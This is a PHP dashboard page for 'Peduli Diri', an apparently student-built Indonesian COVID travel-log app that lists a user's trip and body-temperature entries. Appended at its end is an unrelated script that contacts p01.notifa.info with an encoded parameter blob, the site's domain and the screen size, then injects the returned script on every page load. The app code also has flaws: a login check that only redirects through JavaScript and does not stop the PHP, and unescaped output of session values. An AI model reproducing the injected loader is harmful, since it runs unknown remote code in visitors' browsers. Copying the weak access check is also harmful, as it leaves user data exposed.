<?php
session_start();
if(empty( $_SESSION['nik'])){ ?>
    <script type="text/javascript">
        alert('Maaf Anda Belum Melakukan Login');
        window.location.assign('index.php');
    </script>
<?php } ?>

<!doctype html>
<html lang="en">

<head>
    <title>Peduli Diri</title>
    <link rel="icon" href="assets/images/iconlogo1.png" type="image/x-icon">
    <!-- simplebar CSS-->
    <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
    <!-- Bootstrap core CSS-->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
    <!--Data Tables -->
    <link href="assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
    <link href="assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
    <!-- animate CSS-->
    <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
    <!-- Icons CSS-->
    <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
    <!-- Sidebar CSS-->
    <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
    <!-- Custom Style-->
    <link href="assets/css/app-style.css" rel="stylesheet"/>

<link href="main.css" rel="stylesheet"></head>
<body>
    <div class="app-container app-theme-white body-tabs-shadow fixed-sidebar fixed-header ">
        <div class="app-header header-shadow mx-auto animated bounceInRight">
            <div class="app-header__logo">
                <div class=""><a href="user.php"><img src="assets/images/catatanperjalanan.png" width="80%" height="80%" alt=""></a></div>
                <div class="header__pane ml-auto">
                    <div>
                        <button type="button" class="hamburger close-sidebar-btn hamburger--elastic" data-class="closed-sidebar">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <div class="app-header__mobile-menu">
                <div>
                    <button type="button" class="hamburger hamburger--elastic mobile-toggle-nav">
                        <span class="hamburger-box">
                            <span class="hamburger-inner"></span>
                        </span>
                    </button>
                </div>
            </div>           
        </div>    
        <div class="app-main">
                <div class="app-sidebar sidebar-shadow">
                    <div class="app-header__logo">
                        <div class="logo-src"></div>
                        <div class="header__pane ml-auto">
                            <div>
                                <button type="button" class="hamburger close-sidebar-btn hamburger--elastic" data-class="closed-sidebar">
                                    <span class="hamburger-box">
                                        <span class="hamburger-inner"></span>
                                    </span>
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="app-header__mobile-menu">
                        <div>
                            <button type="button" class="hamburger hamburger--elastic mobile-toggle-nav">
                                <span class="hamburger-box">
                                    <span class="hamburger-inner"></span>
                                </span>
                            </button>
                        </div>
                    </div>
                    <div class="app-header__menu">
                        <span>
                            <button type="button" class="btn-icon btn-icon-only btn btn-primary btn-sm mobile-toggle-header-nav">
                                <span class="btn-icon-wrapper">
                                    <i class="fa fa-ellipsis-v fa-w-6"></i>
                                </span>
                            </button>
                        </span>
                    </div>    
                    <!-- sidebar -->
                    <div class="scrollbar-sidebar">
                        <div class="app-sidebar__inner mx-auto animated bounceInLeft">
                            <ul class="vertical-nav-menu">
                                <li class="app-sidebar__heading">Menu</li>
                                <li <?php (isset($_GET['url']) == 'index.php') ? '': 'active' ?>>
                                    <a href="user.php">
                                        <i class="metismenu-icon pe-7s-monitor text-primary"></i>
                                        Dashboard
                                    </a>
                                </li>
                                <li <?php (isset($_GET['url']) == 'tulis_catatan') ? 'mm-active' : ''; ?> >
                                    <a href="?url=tulis_catatan">
                                        <i class="metismenu-icon pe-7s-pen text-primary"></i>
                                        Tulis Catatan
                                    </a>
                                </li>
                                <li class=" <?php (isset($_GET['url']) == 'catatan_perjalanan') ? ' ' : 'mm=active'; ?> ">
                                    <a href="?url=catatan_perjalanan">
                                        <i class="metismenu-icon pe-7s-note text-primary"></i>
                                        Kelola Catatan
                                    </a>
                                </li>
                                <li>
                                    <a href="?url=data_covid">
                                        <i class="metismenu-icon pe-7s-folder text-primary"></i>
                                        Informasi Covid
                                    </a>
                                </li>
                                <hr>
                                <li>
                                    <a href="logout.php" >
                                        <i class="metismenu-icon pe-7s-next-2 text-danger"></i>
                                        Logout
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <!-- end sidebar -->
                </div>    
                <!-- code biar jadi main template -->
                <?php 
                if(!empty(@$_GET['url'])){
                    switch (@$_GET['url']){
                        case 'tulis_catatan';
                            include 'tulis_catatan.php';
                            break;

                        case 'catatan_perjalanan';
                            include 'catatan_perjalanan.php';
                            break;

                        case 'edit_catatan';
                            include 'edit_catatan.php';
                            break;

                        case 'data_covid';
                            include 'datacovid.php';
                            break;

                        default:
                            echo "<h3> Halaman tidak ditemukan </h3>";
                            break;
                    }
                }else{ ?>
                <!-- isi dashboard -->
                    <div class="app-main__outer mx-auto animated bounceInDown">
                    <div class="app-main__inner">
                        <div class="app-page-title">
                            <div class="page-title-wrapper">
                                <div class="page-title-heading">
                                    <div class="page-title-icon">
                                        <a href="user.php">
                                            <i class="pe-7s-notebook"></i>
                                        </a>
                                    </div>
                                    <div><a href=""> Peduli Diri </a>
                                        <div class="page-title-subheading">
                                        <?php 
                                        echo "Selamat Datang ".$_SESSION['nama_lengkap']. " Di Aplikasi Peduli Diri"; 
                                        ?>
                                        </div>
                                    </div>
                                </div>  
                            </div>
                        </div>            
                        <div class="container">
                            <div class="row">
                                <div class="col-lg-6 col-xl-6">
                                    <div class="card mb-3 widget-content">
                                        <div class="widget-content-wrapper">
                                            <div class="widget-content-left">
                                                <div class="widget-heading">
                                                    <a href="?url=tulis_catatan"> Tulis Catatan</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-6 col-xl-6">
                                    <div class="card mb-3 widget-content">
                                        <div class="widget-content-wrapper">
                                            <div class="widget-content-left">
                                                <div class="widget-heading">
                                                    <a href="?url=catatan_perjalanan">Edit Catatan </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-lg-12">
                                <div class="card">
                                    <div class="card-header"><i class="fa fa-table"></i>Riwayat Perjalanan</div>
                                        <div class="card-body">
                                            <div class="table-responsive">
                                                <table id="example" class="table table-bordered">
                                                    <thead>
                                                        <tr>
                                                            <th>no</th>
                                                            <th>Tanggal</th>
                                                            <th>Waktu</th>
                                                            <th>Lokasi</th>
                                                            <th>Suhu Tubuh</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                    <?php
                                                       $no=1;
                                                       $halaman = 10;
                                                       $data = file('catatan.txt', FILE_IGNORE_NEW_LINES);
                                                       $user = $_SESSION['nik']."|".$_SESSION['nama_lengkap'];
                                                       foreach($data as $value){
                                                           $pecah = explode("|", $value);
                                                           @$key = $pecah['1']."|".$pecah['2'];
                                                           if($key==$user){

                                                    ?>
                                                        <tr>
                                                            <td><?= $no++ ?></td>
                                                            <td><?= $pecah['3'];?></td>
                                                            <td><?= $pecah['4'];?></td>
                                                            <td><?= $pecah['5'];?></td>
                                                            <td><?= $pecah['6'];?></td>
                                                        </tr>
                                                        <?php }} ?>
                                                    </tbody>  
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>  
                        </div>
                    </div>   
                </div>
                <div class="app-wrapper-footer">
                    <div class="app-footer">
                        <div class="app-footer__inner">
                            <div class="app-footer-right">
                                <ul class="nav">
                                    <li class="nav-item">
                                        <a href="javascript:void(0);" class="nav-link">
                                            &copy; Mohammad Reihan Zakya Alawi
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>  
             <?php   } ?>
            </div>
            
    <!-- Architech -->
    <script type="text/javascript" src="assets/scripts/main.js"></script>

    <!-- Bootstrap core JavaScript-->
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>

    <!-- simplebar js -->
    <script src="assets/plugins/simplebar/js/simplebar.js"></script>
    <!-- waves effect js -->
    <script src="assets/js/waves.js"></script>
    <!-- sidebar-menu js -->
    <script src="assets/js/sidebar-menu.js"></script>
    <!-- Custom scripts -->
    <script src="assets/js/app-script.js"></script>

    <!--Data Tables js-->
    <script src="assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
    <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>

 

    <script>
        $(document).ready(function() {
        //Default data table
        $('#default-datatable').DataTable();


        var table = $('#example').DataTable( {
            lengthChange: false,
            buttons: [ 'copy', 'excel', 'pdf', 'print' ]
        } );

        table.buttons().container()
            .appendTo( '#example_wrapper .col-md-6:eq(0)' );
        
        } );

    </script>

<script src="assets/js/sweetalert2@11.js"></script>
<?php if(isset($_SESSION['success'])) { ?>
	<script>
		Swal.fire(
		'Berhasil',
		'<?= $_SESSION['success']; ?>',
		'success'
		)
	</script>
<?php unset($_SESSION['success']); } ?>

<?php if(isset($_SESSION['error'])) { ?>
	<script>
		Swal.fire(
		'Maaf',
		'<?= $_SESSION['error']; ?>',
		'error'
		)
	</script>
<?php unset($_SESSION['error']); } ?>

<script>
 $(document).on('click','#btn-hapus',function(e){
     e.preventDefault();
     var link = $(this).attr('href');
        Swal.fire({
        title: 'Yakin?',
        text: "Kamu akan menghapus data ini",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        cancelButtonText: 'Batal',
        confirmButtonText: 'Ya'
        }).then((result) => {
        if (result.isConfirmed) {
            window.location = link;
        }
        })
 })        
</script>

    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


</html>